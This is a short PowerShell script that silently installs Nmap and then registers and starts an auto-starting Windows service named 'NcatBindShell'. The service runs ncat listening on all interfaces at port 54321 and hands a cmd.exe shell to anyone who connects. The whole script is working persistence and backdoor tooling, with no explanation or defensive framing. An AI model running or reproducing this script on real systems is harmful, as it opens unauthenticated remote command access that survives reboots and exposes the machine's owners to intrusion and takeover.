# Create temp directory for payload delivery
if (!(Test-Path -Path "C:\temp")) {
    New-Item -Path "C:\temp" -ItemType Directory | Out-Null
}

# Download Nmap installer
$installerPath = "C:\temp\nmap-setup.exe"
Invoke-WebRequest "https://nmap.org/dist/nmap-7.95-setup.exe" -OutFile $installerPath

# Install Nmap silently
Start-Process $installerPath -ArgumentList "/S" -Wait

# Path to Ncat
$ncatPath = "C:\Program Files (x86)\Nmap\ncat.exe"

# Ensure Ncat exists, terminate if not
if (!(Test-Path $ncatPath)) {
    Write-Host "Ncat not found. Exiting."
    exit
}

# Create persistent bind-shell service
$serviceName = "NcatBindShell"
$serviceDisplay = "Ncat Bind Shell Persistence"
$port = 54321

# Command to run
$serviceCmd = "powershell.exe -Command `"$ncatPath -nv 0.0.0.0 $port -e cmd.exe`""

# Remove old service if present
if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
    sc.exe stop $serviceName | Out-Null
    sc.exe delete $serviceName | Out-Null
    Start-Sleep -Seconds 2
}

# Create new service
sc.exe create $serviceName binPath= "$serviceCmd" start= auto DisplayName= "\"$serviceDisplay\"" | Out-Null

# Start the service
Start-Service -Name $serviceName
